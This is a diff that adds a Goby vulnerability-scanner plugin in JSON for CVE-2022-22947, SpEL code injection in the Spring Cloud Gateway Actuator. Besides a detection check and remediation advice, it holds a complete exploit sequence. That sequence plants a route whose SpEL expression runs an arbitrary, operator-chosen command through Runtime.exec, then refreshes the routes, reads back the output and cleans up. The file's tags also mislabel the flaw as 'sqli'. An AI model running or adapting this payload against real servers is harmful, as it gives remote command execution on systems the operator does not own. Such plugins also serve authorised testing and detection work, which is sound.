@@ -1,0 +1,291 @@
+{
+      "Name": "Spring Cloud Gateway Actuator API SpEL Code Injection CVE-2022-22947",
+      "Level": "3",
+      "Tags": [
+            "sqli",
+            "rce"
+      ],
+      "GobyQuery": "app=\"springboot\" || app=\"spring-framework\" || app=\"spring-gw\"",
+      "Description": "Spring Cloud Gateway aims to provide a simple, yet effective way to route to APIs and provide cross cutting concerns to them such as: security, monitoring/metrics, and resiliency.",
+      "Product": "Spring Cloud Gateway",
+      "Homepage": "https://spring.io/projects/spring-cloud-gateway",
+      "Author": "",
+      "Impact": "In spring cloud gateway versions prior to 3.1.1+ and 3.0.7+ , applications are vulnerable to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and unsecured. A remote attacker could make a maliciously crafted request that could allow arbitrary remote execution on the remote host.",
+      "Recommendation": "Users of affected versions should apply the following remediation. 3.1.x users should upgrade to 3.1.1+. 3.0.x users should upgrade to 3.0.7+. If the Gateway actuator endpoint is not needed it should be disabled via management.endpoint.gateway.enabled: false. If the actuator is required it should be secured using Spring Security, see https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security.",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2022-22947",
+            "https://tanzu.vmware.com/security/cve-2022-22947"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "Command",
+                  "Type": "input",
+                  "Value": "id"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/actuator/gateway/routes/gobytest",
+                        "follow_redirect": true,
+                        "header": {
+                              "Accept-Encoding": "gzip, deflate",
+                              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
+                              "Content-Type": "application/json"
+                        },
+                        "data_type": "text",
+                        "data": "{\r\n  \"id\": \"gobytest\",\r\n  \"filters\": [{\r\n    \"name\": \"AddResponseHeader\",\r\n    \"args\": {\r\n      \"name\": \"Result\",\r\n      \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream()))}\"\r\n    }\r\n  }],\r\n  \"uri\": \"http://example.com\"\r\n}",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "201",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$head",
+                                    "operation": "contains",
+                                    "value": "gobytest",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "DELETE",
+                        "uri": "/actuator/gateway/routes/gobytest",
+                        "follow_redirect": true,
+                        "header": {
+                              "Accept-Encoding": "gzip, deflate",
+                              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/actuator/gateway/refresh",
+                        "follow_redirect": true,
+                        "header": {
+                              "Accept-Encoding": "gzip, deflate",
+                              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/actuator/gateway/routes/gobytest",
+                        "follow_redirect": true,
+                        "header": {
+                              "Accept-Encoding": "gzip, deflate",
+                              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
+                              "Content-Type": "application/json"
+                        },
+                        "data_type": "text",
+                        "data": "{\r\n  \"id\": \"gobytest\",\r\n  \"filters\": [{\r\n    \"name\": \"AddResponseHeader\",\r\n    \"args\": {\r\n      \"name\": \"Result\",\r\n      \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"{{{Command}}}\\\"}).getInputStream()))}\"\r\n    }\r\n  }],\r\n  \"uri\": \"http://example.com\"\r\n}",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "201",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$head",
+                                    "operation": "contains",
+                                    "value": "gobytest",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/actuator/gateway/refresh",
+                        "follow_redirect": true,
+                        "header": {
+                              "Accept-Encoding": "gzip, deflate",
+                              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/actuator/gateway/routes/gobytest",
+                        "follow_redirect": true,
+                        "header": {
+                              "Accept-Encoding": "gzip, deflate",
+                              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|(.*)"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "DELETE",
+                        "uri": "/actuator/gateway/routes/gobytest",
+                        "follow_redirect": true,
+                        "header": {
+                              "Accept-Encoding": "gzip, deflate",
+                              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/actuator/gateway/refresh",
+                        "follow_redirect": true,
+                        "header": {
+                              "Accept-Encoding": "gzip, deflate",
+                              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
